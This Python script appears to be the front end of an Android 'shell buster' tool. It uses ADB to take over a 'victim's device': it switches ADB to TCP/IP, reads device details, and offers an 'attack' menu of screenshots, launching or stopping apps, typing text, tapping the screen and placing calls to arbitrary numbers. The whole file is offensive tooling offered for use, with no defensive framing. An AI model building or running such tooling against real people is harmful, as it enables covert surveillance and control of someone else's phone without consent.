from main import ADB
import os
import time
from termcolor import colored as cld
import subprocess

BANNER = cld("""

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘

    )                         
 ( /(                      )  
 )\())   (      )       ( /(  
((_)\    )\  ( /(   (   )\()) 
 _((_)  ((_) )(_))  )\ ((_)\  
| \| | _ | |((_)_  ((_)| |(_) 
| .` || || |/ _` |/ _| | / /  
|_|\_| \__/ \__,_|\__| |_\_\  
                              
V.1.0. : ANDROID SHELL BUSTER.

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘

""", 'green')

print(BANNER)

print("")

ui = input(cld("╰┈➤ Connect victim's device ? y/N : ", 'green'))

if ui == "Y" or ui == "y" :
    
    adb = ADB()
    
    cmd_ln3 = 'adb devices'
    cmd_ln4 = 'adb adb start-server'
        
    os.system(cmd_ln3)
    time.sleep(5)
    os.system(cmd_ln4)
    time.sleep(5)
    os.system(cmd_ln3)
    time.sleep(5)
    adb.tcpip()

    print(cld("Default Informations of Victim's Device :~ ", 'red', 'on_white'))
    print("")
    print(adb.devices())
    print(adb.model())
    print(adb.android_version())
    print(adb.battery())
    
    print("")
    
    runtime = True
    while runtime :
    
        d = {1 : "˙✧˖°📷 ༘ ⋆｡˚ Take screenshot.", 2 : "🏠︎ Go To Home.", 3 : "📚 Launch apps.", 4 : " ⃠  Stop apps.", 5 : "⌨️ Type text.", 6 : "🖱️: ̗̀➛ Click anywhere on the screen.", 7 : "Put a phone call.", 8 : " ⍈ Exit."}
        print(d)
        print("")
        ui2 = int(input(cld("➤ Enter attack that you wants to perform : ", 'red')))
        print("")
        
        if ui2 == 1 :
        
            adb.screenshot("image.png")
        
        if ui2 == 2 :
        
            adb.home()
            
        if ui2 == 3 :
            
            print("")
            
            package = input(cld("Enter package details : ", 'cyan'))
            
            adb.launch(f"{package}")
            
        if ui2 == 4 :
            
            print("")
            
            package2 = input(cld("Enter package details : ", 'cyan'))
            
            adb.stop(f"{package2}")
            
        if ui2 == 5 :
            
            print("")
            
            text_data = input(cld("Enter text : ", 'cyan'))
            
            adb.text(f"{text_data}")
            
        if ui2 == 6 :
            
            print("")
            
            mouse_x = int(input(cld("Enter mouse abscissa (x - coordinate) : ", 'cyan')))
            mouse_y = int(input(cld("Enter mouse ordinate (y - coordinate) : ", 'cyan')))
            
            adb.tap(mouse_x, mouse_y)
            
        if ui2 == 7 :
            
            phn = int(input(cld("Enter any phone number with country code : ", 'cyan')))
            subprocess.run(f'adb shell am start -a android.intent.action.CALL -d tel:{phn}')
            
        if ui2 == 8 :
            
            subprocess.run('adb disconnect')
            time.sleep(5)
            subprocess.run('adb kill-server')
            time.sleep(1)
            runtime = False
    
elif ui == "N" or ui == "n" :

    exit()    